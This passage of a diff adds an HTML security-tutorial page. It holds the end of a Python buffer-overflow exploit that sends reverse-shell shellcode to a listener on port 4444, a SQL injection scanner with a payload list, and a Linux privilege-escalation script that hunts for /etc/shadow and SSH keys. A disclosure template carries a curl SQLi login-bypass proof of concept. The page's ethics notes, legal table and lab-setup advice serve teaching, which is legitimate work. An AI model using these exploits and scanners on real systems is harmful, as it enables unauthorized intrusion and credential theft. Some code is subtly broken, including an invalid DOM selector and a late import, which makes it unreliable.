+            print(f"[*] Sending {len(payload)} bytes...")
+            sock.send(payload + b"\n")
+            
+            sock.close()
+            print("[+] Exploit sent successfully")
+            
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            sys.exit(1)
+
+# Usage example
+if __name__ == "__main__":
+    print("=" * 60)
+    print("Buffer Overflow Exploit Framework")
+    print("FOR EDUCATIONAL PURPOSES ONLY")
+    print("=" * 60)
+    
+    # These would be discovered during fuzzing
+    TARGET_IP = "192.168.1.100"
+    TARGET_PORT = 9999
+    EIP_OFFSET = 524  # Found using pattern_create/offset
+    EIP_ADDRESS = 0x311712F3  # JMP ESP address
+    
+    exploit = BufferOverflowExploit(TARGET_IP, TARGET_PORT)
+    
+    # Generate shellcode
+    shellcode = exploit.generate_shellcode("192.168.1.50", 4444)
+    
+    # Craft final payload
+    payload = exploit.exploit(EIP_OFFSET, EIP_ADDRESS, shellcode)
+    
+    # Send exploit
+    exploit.send_exploit(payload)
+    
+    print("\n[!] Start listener: nc -lvnp 4444")</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-database"></i> SQL Injection Automation</h2>
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">Python SQLi Scanner</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+<pre><code class="python">import requests
+from urllib.parse import urljoin
+from bs4 import BeautifulSoup
+import re
+
+class SQLiScanner:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.session = requests.Session()
+        self.vulnerable_params = []
+        
+        # Common SQLi payloads
+        self.payloads = [
+            "'",  # Basic single quote
+            "''",  # Double single quote
+            "`",  # Backtick
+            "\"",  # Double quote
+            "' OR '1'='1",  # Always true
+            "' OR '1'='1' --",  # Comment out
+            "' UNION SELECT NULL--",  # Union based
+            "' AND 1=1--",  # Boolean based
+            "' AND 1=2--",  # Boolean false
+            "' OR SLEEP(5)--",  # Time based
+            "1' ORDER BY 1--",  # Column count
+        ]
+    
+    def discover_forms(self):
+        """Discover all forms on target page"""
+        forms = []
+        try:
+            response = self.session.get(self.target_url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            for form in soup.find_all('form'):
+                form_info = {
+                    'action': form.get('action'),
+                    'method': form.get('method', 'GET').upper(),
+                    'inputs': []
+                }
+                
+                for input_tag in form.find_all('input'):
+                    input_info = {
+                        'name': input_tag.get('name'),
+                        'type': input_tag.get('type', 'text'),
+                        'value': input_tag.get('value', '')
+                    }
+                    form_info['inputs'].append(input_info)
+                
+                forms.append(form_info)
+            
+            return forms
+        except:
+            return []
+    
+    def test_parameter(self, url, method, params):
+        """Test a specific parameter for SQLi"""
+        for payload in self.payloads:
+            test_params = params.copy()
+            
+            # Inject payload into each parameter
+            for param_name in test_params:
+                if test_params[param_name]:  # Don't test empty values
+                    original = test_params[param_name]
+                    test_params[param_name] = original + payload
+                    
+                    try:
+                        if method == "GET":
+                            response = self.session.get(url, params=test_params, timeout=5)
+                        else:
+                            response = self.session.post(url, data=test_params, timeout=5)
+                        
+                        # Check for SQL error messages
+                        error_patterns = [
+                            r"You have an error in your SQL syntax",
+                            r"Warning: mysql",
+                            r"Unclosed quotation mark",
+                            r"PostgreSQL.*ERROR",
+                            r"ORA-[0-9]{5}",
+                            r"Microsoft OLE DB Provider",
+                            r"Incorrect syntax near"
+                        ]
+                        
+                        for pattern in error_patterns:
+                            if re.search(pattern, response.text, re.IGNORECASE):
+                                print(f"[!] SQLi found in {param_name}")
+                                print(f"    Payload: {payload}")
+                                print(f"    URL: {response.url}")
+                                return True
+                        
+                        # Time-based detection
+                        if "SLEEP" in payload.upper():
+                            start_time = time.time()
+                            if method == "GET":
+                                self.session.get(url, params=test_params, timeout=10)
+                            else:
+                                self.session.post(url, data=test_params, timeout=10)
+                            elapsed = time.time() - start_time
+                            
+                            if elapsed > 4:  # Significant delay
+                                print(f"[!] Time-based SQLi in {param_name}")
+                                return True
+                    
+                    except requests.exceptions.Timeout:
+                        if "SLEEP" in payload.upper():
+                            print(f"[!] Time-based SQLi (timeout) in {param_name}")
+                            return True
+                    except:
+                        continue
+                    
+                    # Reset parameter
+                    test_params[param_name] = original
+        
+        return False
+    
+    def scan(self):
+        """Main scanning function"""
+        print(f"[*] Scanning {self.target_url} for SQL injection vulnerabilities")
+        
+        forms = self.discover_forms()
+        print(f"[*] Found {len(forms)} forms")
+        
+        for form in forms:
+            action = form['action']
+            method = form['method']
+            
+            # Build full URL
+            if action:
+                full_url = urljoin(self.target_url, action)
+            else:
+                full_url = self.target_url
+            
+            # Prepare parameters
+            params = {}
+            for input_field in form['inputs']:
+                if input_field['name'] and input_field['type'] != 'submit':
+                    params[input_field['name']] = input_field['value'] or 'test'
+            
+            print(f"[*] Testing form: {full_url} ({method})")
+            
+            if self.test_parameter(full_url, method, params):
+                self.vulnerable_params.append({
+                    'url': full_url,
+                    'method': method,
+                    'params': params
+                })
+        
+        return self.vulnerable_params
+
+# Usage
+if __name__ == "__main__":
+    import time
+    
+    scanner = SQLiScanner("http://testphp.vulnweb.com/")
+    vulnerabilities = scanner.scan()
+    
+    if vulnerabilities:
+        print("\n[+] Vulnerabilities found:")
+        for vuln in vulnerabilities:
+            print(f"  URL: {vuln['url']}")
+            print(f"  Method: {vuln['method']}")
+    else:
+        print("\n[-] No SQL injection vulnerabilities found")</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Chapter 5: Post-Exploitation -->
+            <section id="post-exploitation" class="chapter">
+                <div class="chapter-header">
+                    <h1 class="chapter-title">Post-Exploitation Techniques</h1>
+                    <div class="chapter-subtitle">What to Do After Getting Access</div>
+                </div>
+
+                <div class="warning-box">
+                    <div class="warning-header">
+                        <i class="fas fa-user-secret"></i>
+                        <h3>Ethical Consideration</h3>
+                    </div>
+                    <p>Post-exploitation activities should be clearly defined in the scope of engagement. Never exceed authorized access.</p>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-chess-board"></i> Privilege Escalation Checklist</h2>
+                    
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-dots">
+                                <span class="terminal-dot red"></span>
+                                <span class="terminal-dot yellow"></span>
+                                <span class="terminal-dot green"></span>
+                            </div>
+                            <div class="terminal-title">Post-Exploitation Enumeration</div>
+                        </div>
+                        <div class="terminal-content">
+                            <span class="terminal-prompt">$</span> <span class="terminal-command">id</span><br>
+                            <span class="terminal-output">uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom)</span><br><br>
+                            
+                            <span class="terminal-prompt">$</span> <span class="terminal-command">sudo -l</span><br>
+                            <span class="terminal-output">User user may run the following commands:<br>
+    (ALL) NOPASSWD: /usr/bin/find</span><br><br>
+                            
+                            <span class="terminal-prompt">$</span> <span class="terminal-command">find /etc -name "*.conf" -exec cat {} \;</span><br>
+                            <span class="terminal-output"># Checking for sensitive config files...</span><br><br>
+                            
+                            <span class="terminal-prompt">$</span> <span class="terminal-command">ls -la /etc/crontab</span><br>
+                            <span class="terminal-output">-rw-r--r-- 1 root root 722 Dec 1 00:00 /etc/crontab</span><br><br>
+                            
+                            <span class="terminal-prompt">$</span> <span class="terminal-command">cat /etc/crontab</span><br>
+                            <span class="terminal-output"># Example of exploiting cron job:<br>
+# * * * * * root /usr/local/bin/backup.sh</span>
+                        </div>
+                    </div>
+
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">Linux Privilege Escalation Script</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+<pre><code class="python">#!/usr/bin/env python3
+"""
+Linux Privilege Escalation Enumeration Script
+Run after obtaining initial shell access
+"""
+
+import os
+import subprocess
+import json
+from datetime import datetime
+
+class LinPEAS:
+    def __init__(self):
+        self.results = {}
+        self.colors = {
+            'RED': '\033[91m',
+            'GREEN': '\033[92m',
+            'YELLOW': '\033[93m',
+            'BLUE': '\033[94m',
+            'END': '\033[0m'
+        }
+    
+    def run_command(self, cmd):
+        """Execute command and return output"""
+        try:
+            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
+            return result.decode('utf-8', errors='ignore').strip()
+        except:
+            return ""
+    
+    def check_sudo(self):
+        """Check sudo permissions"""
+        print(f"{self.colors['BLUE']}[*] Checking sudo permissions...{self.colors['END']}")
+        sudo_l = self.run_command("sudo -l 2>/dev/null")
+        
+        if sudo_l and "may run the following commands" in sudo_l:
+            print(f"{self.colors['GREEN']}[+] Sudo permissions found:{self.colors['END']}")
+            print(sudo_l)
+            self.results['sudo'] = sudo_l
+            
+            # Check for dangerous binaries
+            dangerous_binaries = ['find', 'vim', 'nano', 'awk', 'perl', 'python', 'ruby']
+            for binary in dangerous_binaries:
+                if binary in sudo_l.lower():
+                    print(f"{self.colors['YELLOW']}[!] Dangerous binary allowed: {binary}{self.colors['END']}")
+    
+    def check_suid(self):
+        """Check SUID binaries"""
+        print(f"\n{self.colors['BLUE']}[*] Checking SUID binaries...{self.colors['END']}")
+        suid_binaries = self.run_command("find / -perm -4000 -type f 2>/dev/null")
+        
+        if suid_binaries:
+            dangerous_suid = [
+                'nmap', 'vim', 'find', 'bash', 'more', 'less',
+                'nano', 'cp', 'mv', 'awk', 'sed', 'perl',
+                'python', 'ruby', 'php', 'tar', 'zip'
+            ]
+            
+            for binary in dangerous_suid:
+                if binary in suid_binaries:
+                    print(f"{self.colors['YELLOW']}[!] Dangerous SUID binary: {binary}{self.colors['END']}")
+            
+            self.results['suid'] = suid_binaries.split('\n')
+    
+    def check_cron(self):
+        """Check cron jobs"""
+        print(f"\n{self.colors['BLUE']}[*] Checking cron jobs...{self.colors['END']}")
+        
+        # System cron
+        cron_files = ['/etc/crontab', '/etc/cron.d/*', '/etc/cron.daily/*',
+                      '/etc/cron.hourly/*', '/etc/cron.monthly/*', '/etc/cron.weekly/*']
+        
+        for cron_file in cron_files:
+            if os.path.exists(cron_file.replace('*', '')):
+                content = self.run_command(f"cat {cron_file} 2>/dev/null")
+                if content and "root" in content:
+                    print(f"{self.colors['GREEN']}[+] Cron file found: {cron_file}{self.colors['END']}")
+                    self.results['cron'] = self.results.get('cron', []) + [cron_file]
+        
+        # User cron
+        user_cron = self.run_command("crontab -l 2>/dev/null")
+        if user_cron:
+            print(f"{self.colors['GREEN']}[+] User cron jobs found{self.colors['END']}")
+            self.results['user_cron'] = user_cron
+    
+    def check_processes(self):
+        """Check running processes"""
+        print(f"\n{self.colors['BLUE']}[*] Checking running processes...{self.colors['END']}")
+        processes = self.run_command("ps aux")
+        
+        # Look for interesting processes
+        interesting = ['mysql', 'postgres', 'redis', 'docker', 'kube',
+                      'ssh', 'apache', 'nginx', 'tomcat']
+        
+        for proc in interesting:
+            if proc in processes.lower():
+                print(f"{self.colors['GREEN']}[+] Found interesting process: {proc}{self.colors['END']}")
+        
+        self.results['processes'] = processes
+    
+    def check_network(self):
+        """Check network connections"""
+        print(f"\n{self.colors['BLUE']}[*] Checking network connections...{self.colors['END']}")
+        
+        # Listening ports
+        netstat = self.run_command("netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null")
+        if netstat:
+            print(f"{self.colors['GREEN']}[+] Listening ports:{self.colors['END']}")
+            print(netstat)
+            self.results['listening_ports'] = netstat
+        
+        # Established connections
+        connections = self.run_command("netstat -tan 2>/dev/null || ss -tan 2>/dev/null")
+        if connections:
+            self.results['connections'] = connections
+    
+    def check_filesystem(self):
+        """Check interesting files and directories"""
+        print(f"\n{self.colors['BLUE']}[*] Checking filesystem...{self.colors['END']}")
+        
+        # World-writable directories
+        ww_dirs = self.run_command("find / -type d -perm -0002 -exec ls -ld {} \\; 2>/dev/null | grep -v proc")
+        if ww_dirs:
+            print(f"{self.colors['YELLOW']}[!] World-writable directories:{self.colors['END']}")
+            print(ww_dirs)
+            self.results['world_writable'] = ww_dirs
+        
+        # Check for sensitive files
+        sensitive_files = [
+            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/ssh/ssh_config',
+            '/home/*/.ssh/id_rsa', '/home/*/.ssh/authorized_keys',
+            '/var/log/auth.log', '/var/log/syslog'
+        ]
+        
+        for file_pattern in sensitive_files:
+            if '*' in file_pattern:
+                files = self.run_command(f"ls -la {file_pattern} 2>/dev/null")
+                if files:
+                    print(f"{self.colors['GREEN']}[+] Found: {file_pattern}{self.colors['END']}")
+                    self.results['sensitive_files'] = self.results.get('sensitive_files', []) + [file_pattern]
+            elif os.path.exists(file_pattern):
+                perms = self.run_command(f"ls -la {file_pattern}")
+                print(f"{self.colors['GREEN']}[+] Found: {file_pattern}{self.colors['END']}")
+                print(perms)
+                self.results['sensitive_files'] = self.results.get('sensitive_files', []) + [file_pattern]
+    
+    def run_all_checks(self):
+        """Run all enumeration checks"""
+        print(f"{self.colors['BLUE']}{'='*60}{self.colors['END']}")
+        print(f"{self.colors['YELLOW']}   Linux Privilege Escalation Enumeration Script")
+        print(f"   Run time: {datetime.now()}")
+        print(f"{self.colors['BLUE']}{'='*60}{self.colors['END']}\n")
+        
+        self.check_sudo()
+        self.check_suid()
+        self.check_cron()
+        self.check_processes()
+        self.check_network()
+        self.check_filesystem()
+        
+        # Save results
+        with open('linpeas_results.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        print(f"\n{self.colors['GREEN']}[+] Results saved to linpeas_results.json{self.colors['END']}")
+        
+        # Generate summary
+        print(f"\n{self.colors['BLUE']}{'='*60}{self.colors['END']}")
+        print(f"{self.colors['YELLOW']}   PRIVILEGE ESCALATION VECTORS FOUND:{self.colors['END']}")
+        
+        vectors = []
+        if 'sudo' in self.results:
+            vectors.append("Sudo privileges - check for exploitable binaries")
+        if 'suid' in self.results:
+            vectors.append("SUID binaries - check GTFO bins")
+        if 'cron' in self.results:
+            vectors.append("Cron jobs - check for writable scripts")
+        if 'world_writable' in self.results:
+            vectors.append("World-writable directories")
+        
+        if vectors:
+            for i, vector in enumerate(vectors, 1):
+                print(f"   {i}. {vector}")
+        else:
+            print("   No obvious vectors found. Check kernel exploits.")
+        
+        print(f"{self.colors['BLUE']}{'='*60}{self.colors['END']}")
+
+if __name__ == "__main__":
+    pe = LinPEAS()
+    pe.run_all_checks()</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Chapter 6: Responsible Security -->
+            <section id="responsible" class="chapter">
+                <div class="chapter-header">
+                    <h1 class="chapter-title">Ethical Hacking & Responsible Disclosure</h1>
+                    <div class="chapter-subtitle">Doing Security Research the Right Way</div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-balance-scale"></i> Legal Framework & Ethics</h2>
+                    
+                    <div class="warning-box">
+                        <div class="warning-header">
+                            <i class="fas fa-gavel"></i>
+                            <h3>Legal Compliance</h3>
+                        </div>
+                        <p>Ignorance of the law is not a defense. Understand these key regulations:</p>
+                    </div>
+
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Law/Regulation</th>
+                                    <th>Jurisdiction</th>
+                                    <th>Key Provisions</th>
+                                    <th>Penalties</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Computer Fraud and Abuse Act (CFAA)</td>
+                                    <td>United States</td>
+                                    <td>Unauthorized access to computers, exceeding authorized access</td>
+                                    <td>Fines up to $250,000, 5-20 years imprisonment</td>
+                                </tr>
+                                <tr>
+                                    <td>GDPR Article 32</td>
+                                    <td>European Union</td>
+                                    <td>Security of processing, requires appropriate technical measures</td>
+                                    <td>Fines up to €20M or 4% global revenue</td>
+                                </tr>
+                                <tr>
+                                    <td>Computer Misuse Act 1990</td>
+                                    <td>United Kingdom</td>
+                                    <td>Unauthorized access to computer material, impairing operation</td>
+                                    <td>Up to 10 years imprisonment</td>
+                                </tr>
+                                <tr>
+                                    <td>Cybersecurity Law of China</td>
+                                    <td>China</td>
+                                    <td>Network operations security, data protection</td>
+                                    <td>Fines, business suspension, criminal liability</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <h3 style="margin-top: 2rem; color: var(--info-color);">Responsible Disclosure Process</h3>
+                    
+                    <div class="diagram-container">
+                        <div class="mermaid">
+                            graph LR
+                                A[Discover Vulnerability] --> B[Verify & Document]
+                                B --> C[Check for Duplicates]
+                                C --> D[Prepare Report]
+                                D --> E[Contact Vendor]
+                                E --> F{Response?}
+                                F -->|Timely| G[Coordinated Disclosure]
+                                F -->|No Response| H[Extended Deadline]
+                                H --> I{Still No?}
+                                I -->|Yes| J[Full Disclosure]
+                                I -->|No| G
+                                
+                                G --> K[Patch Released]
+                                J --> L[Public Announcement]
+                        </div>
+                    </div>
+
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-language">Vulnerability Report Template</span>
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                        </div>
+<pre><code># Vulnerability Disclosure Report
+# Template for responsible disclosure
+
+=== VULNERABILITY REPORT ===
+
+Date: $(date)
+Reporter: $(your_name)
+Contact: $(your_email)
+PGP Key: $(your_pgp_key)
+
+1. EXECUTIVE SUMMARY
+   - Vulnerability Type: [e.g., SQL Injection, RCE]
+   - CVSS Score: [e.g., 8.5 HIGH]
+   - Affected Component: [e.g., Login API]
+   - Impact: [e.g., Unauthorized data access]
+
+2. TECHNICAL DETAILS
+   - Affected URL: https://example.com/login
+   - Affected Parameter: username
+   - Vulnerability Description:
+     [Detailed description of the vulnerability]
+   
+   - Proof of Concept:
+     ```
+     curl -X POST https://example.com/login \
+          -d "username=admin' OR '1'='1&password=anything"
+     ```
+   
+   - Steps to Reproduce:
+     1. Navigate to https://example.com/login
+     2. Enter payload in username field
+     3. Observe successful login bypass
+
+3. IMPACT ASSESSMENT
+   - Confidentiality Impact: HIGH
+   - Integrity Impact: MEDIUM
+   - Availability Impact: LOW
+   - Affected Users: All users
+   - Data Exposure: User credentials, PII
+
+4. REMEDIATION RECOMMENDATIONS
+   - Short-term:
+     1. Implement WAF rules to block SQLi patterns
+     2. Disable affected endpoint temporarily
+   
+   - Long-term:
+     1. Implement prepared statements
+     2. Input validation and sanitization
+     3. Regular security testing
+
+5. TIMELINE
+   - Discovery Date: YYYY-MM-DD
+   - Report Date: YYYY-MM-DD
+   - Vendor Contact Date: YYYY-MM-DD
+   - Expected Patch Date: YYYY-MM-DD (90 days from report)
+   - Public Disclosure Date: YYYY-MM-DD (if no response)
+
+6. ADDITIONAL INFORMATION
+   - Testing Methodology: [e.g., Manual testing, authorized scope]
+   - Tools Used: [e.g., Burp Suite, custom scripts]
+   - References: [CWE-89, OWASP Top 10 A1]
+
+=== END REPORT ===
+
+Note: This report is confidential and should only be shared
+with authorized personnel for remediation purposes.</code></pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-flask"></i> Safe Lab Environment Setup</h2>
+                    
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-dots">
+                                <span class="terminal-dot red"></span>
+                                <span class="terminal-dot yellow"></span>
+                                <span class="terminal-dot green"></span>
+                            </div>
+                            <div class="terminal-title">Kali Linux Lab Setup</div>
+                        </div>
+                        <div class="terminal-content">
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">apt update && apt upgrade -y</span><br>
+                            <span class="terminal-output">Updating package lists...</span><br><br>
+                            
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">apt install virtualbox virtualbox-ext-pack -y</span><br>
+                            <span class="terminal-output">Installing virtualization tools...</span><br><br>
+                            
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">wget https://www.virtualbox.org/wiki/Linux_Downloads</span><br>
+                            <span class="terminal-output">Downloading VirtualBox...</span><br><br>
+                            
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">echo "Creating isolated network..."</span><br>
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">VBoxManage natnetwork add --netname labnet --network "10.0.0.0/24" --enable</span><br>
+                            <span class="terminal-output">Network 'labnet' created</span><br><br>
+                            
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">echo "Downloading vulnerable VMs..."</span><br>
+                            <span class="terminal-prompt">#</span> <span class="terminal-command">wget https://download.vulnhub.com/metasploitable/Metasploitable.zip</span><br>
+                            <span class="terminal-output">Downloading Metasploitable...</span>
+                        </div>
+                    </div>
+
+                    <h3 style="margin-top: 2rem; color: var(--info-color);">Recommended Lab Setup</h3>
+                    
+                    <div class="command-grid">
+                        <div class="command-item">
+                            <div class="command">VirtualBox + Internal Network</div>
+                            <div class="description">Isolated lab environment with no internet access</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">Kali Linux (Attacker)</div>
+                            <div class="description">Primary penetration testing distribution</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">Metasploitable 2/3 (Target)</div>
+                            <div class="description">Intentionally vulnerable Linux VM</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">Windows 10 Evaluation (Target)</div>
+                            <div class="description">Windows environment for testing</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">OWASP WebGoat (Target)</div>
+                            <div class="description">Web application security training</div>
+                        </div>
+                        <div class="command-item">
+                            <div class="command">pfSense (Firewall)</div>
+                            <div class="description">Network segmentation and monitoring</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer style="text-align: center; margin-top: 4rem; padding: 2rem; border-top: 1px solid var(--border-color);">
+                <h3>Cybersecurity Learning Hub</h3>
+                <p>Created by <a href="https://github.com/gaut1ham" style="color: var(--accent-color);">@gaut1ham</a> | Security-Focused Software Engineer</p>
+                <p style="color: #8b949e; margin-top: 1rem; font-size: 0.9rem;">
+                    <strong>Disclaimer:</strong> This content is for educational purposes only.<br>
+                    Always obtain proper authorization before testing any system.<br>
+                    Last updated: $(date)
+                </p>
+            </footer>
+        </main>
+    </div>
+
+    <script>
+        // Copy code functionality
+        function copyCode(button) {
+            const codeBlock = button.closest('.code-container');
+            const code = codeBlock.querySelector('code').innerText;
+            
+            navigator.clipboard.writeText(code).then(() => {
+                const originalText = button.textContent;
+                button.textContent = 'Copied!';
+                button.style.background = 'var(--accent-color)';
+                button.style.borderColor = 'var(--accent-color)';
+                
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.style.background = '';
+                    button.style.borderColor = '';
+                }, 2000);
+            });
+        }
+
+        // Smooth scrolling for navigation
+        document.querySelectorAll('.nav-list a').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Remove active class from all links
+                document.querySelectorAll('.nav-list a').forEach(link => {
+                    link.classList.remove('active');
+                });
+                
+                // Add active class to clicked link
+                this.classList.add('active');
+                
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 20,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // Update active nav link on scroll
+        window.addEventListener('scroll', () => {
+            const chapters = document.querySelectorAll('.chapter');
+            const scrollPos = window.scrollY + 100;
+            
+            chapters.forEach(chapter => {
+                const chapterTop = chapter.offsetTop;
+                const chapterHeight = chapter.clientHeight;
+                const chapterId = chapter.getAttribute('id');
+                
+                if (scrollPos >= chapterTop && scrollPos < chapterTop + chapterHeight) {
+                    document.querySelectorAll('.nav-list a').forEach(link => {
+                        link.classList.remove('active');
+                        if (link.getAttribute('href') === `#${chapterId}`) {
+                            link.classList.add('active');
+                        }
+                    });
+                }
+            });
+        });
+
+        // Auto-update date
+        document.addEventListener('DOMContentLoaded', () => {
+            const dateElements = document.querySelectorAll('$(date)');
+            const now = new Date();
+            const formattedDate = now.toLocaleDateString('en-US', {
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric'
+            });
+            
+            dateElements.forEach(element => {
+                if (element.textContent.includes('$(date)')) {
+                    element.textContent = element.textContent.replace('$(date)', formattedDate);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
